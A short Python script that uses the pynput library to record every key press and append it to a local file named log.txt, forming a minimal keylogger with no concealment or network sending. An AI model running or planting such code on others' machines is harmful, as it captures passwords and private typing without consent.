from pynput.keyboard import Listener

def log(key):
    with open('log.txt', 'a') as log:
        log.write(str(key))

with Listener(on_press=log) as monitor:
    monitor.join()          